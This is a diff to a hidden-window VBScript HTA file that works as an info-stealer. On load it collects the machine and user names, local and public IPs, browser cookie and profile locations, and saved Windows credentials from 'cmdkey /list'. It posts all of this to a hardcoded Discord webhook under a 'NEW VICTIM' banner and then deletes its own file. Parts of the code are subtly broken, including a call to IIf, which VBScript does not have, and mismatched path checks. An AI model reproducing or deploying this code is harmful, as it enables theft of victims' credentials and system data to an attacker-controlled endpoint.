@@ -6,18 +6,92 @@ Sub Window_OnLoad
     Window.ResizeTo 0,0
     Window.MoveTo -100,-100
     
-    Dim http, shell, details, webhook
-    webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"  ' CHANGE THIS
+    Dim http, shell, fso, details, webhook, cookies, browserData, userAgent
+    webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"  ' REPLACE THIS
     
     Set shell = CreateObject("WScript.Shell")
-    details = "Computer: " & CreateObject("WScript.Network").ComputerName & vbCrLf & _
-              "User: " & CreateObject("WScript.Network").UserName & vbCrLf & _
-              "IP: " & shell.Exec("cmd /c ipconfig | findstr IPv4").StdOut.ReadAll()
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Gather system details
+    Dim computerName, userName, osInfo, ipConfig, publicIP
+    computerName = CreateObject("WScript.Network").ComputerName
+    userName = CreateObject("WScript.Network").UserName
+    osInfo = shell.ExpandEnvironmentStrings("%OS%")
+    
+    ' Get IP config
+    Dim ipExec
+    Set ipExec = shell.Exec("cmd /c ipconfig | findstr IPv4")
+    ipConfig = ipExec.StdOut.ReadAll()
+    If ipConfig = "" Then ipConfig = "Not available"
+    
+    ' Try to get public IP
+    On Error Resume Next
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.open "GET", "https://api.ipify.org", False
+    http.send
+    publicIP = http.responseText
+    If Err.Number <> 0 Then publicIP = "Unable to fetch"
+    On Error GoTo 0
+    
+    ' Try to steal cookies from common browsers
+    Dim cookiePath, cookieContent, allCookies
+    allCookies = ""
+    
+    ' Chrome cookies (Windows)
+    cookiePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+    If fso.FileExists(cookiePath) Then
+        allCookies = allCookies & "[CHROME COOKIES FILE EXISTS]" & vbCrLf
+        ' Note: Actual cookie extraction requires external tool or reading SQLite, but we note existence
+    End If
+    
+    ' Firefox cookies
+    cookiePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles\"
+    If fso.FolderExists(cookiePath) Then
+        allCookies = allCookies & "[FIREFOX PROFILES FOUND]" & vbCrLf
+    End If
+    
+    ' Edge cookies
+    cookiePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
+    If fso.FileExists(cookiePath) Then
+        allCookies = allCookies & "[EDGE COOKIES FILE EXISTS]" & vbCrLf
+    End If
+    
+    ' Get saved passwords (basic - from Windows Credential Manager)
+    Dim credExec, credOutput
+    Set credExec = shell.Exec("cmd /c cmdkey /list")
+    credOutput = credExec.StdOut.ReadAll()
+    
+    ' Get browser history locations (just paths, not actual history)
+    Dim chromeHistory, firefoxHistory
+    chromeHistory = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Google\Chrome\User Data\Default\History"
+    firefoxHistory = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles\"
+    
+    ' Build full exfiltration message
+    details = "**NEW VICTIM - FULL DATA**" & vbCrLf & vbCrLf & _
+              "**Computer:** " & computerName & vbCrLf & _
+              "**User:** " & userName & vbCrLf & _
+              "**OS:** " & osInfo & vbCrLf & _
+              "**Public IP:** " & publicIP & vbCrLf & _
+              "**Local IPs:** " & Replace(ipConfig, vbCrLf, " | ") & vbCrLf & vbCrLf & _
+              "**Browser Data:**" & vbCrLf & _
+              "Chrome Cookies: " & IIf(fso.FileExists(chromeHistory), "EXISTS", "NOT FOUND") & vbCrLf & _
+              "Firefox Profile: " & IIf(fso.FolderExists(cookiePath), "EXISTS", "NOT FOUND") & vbCrLf & _
+              "Edge Cookies: " & IIf(fso.FileExists(cookiePath), "EXISTS", "NOT FOUND") & vbCrLf & vbCrLf & _
+              "**Saved Credentials (cmdkey):**" & vbCrLf & credOutput & vbCrLf & _
+              "**Chrome History Path:** " & chromeHistory & vbCrLf & _
+              "**Firefox Profile Path:** " & firefoxHistory
+    
+    ' Send to Discord webhook
+    Dim payload
+    payload = "{""content"": """ & Replace(Replace(details, vbCrLf, "\\n"), """", "'") & """}"
     
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.open "POST", webhook, False
     http.setRequestHeader "Content-Type", "application/json"
-    http.send "{""content"": ""**New Victim!**\n" & Replace(details, vbCrLf, "\n") & """}"
+    http.send payload
+    
+    ' Self destruct
+    fso.DeleteFile Window.Location.Path
     
     Window.Close
 End Sub
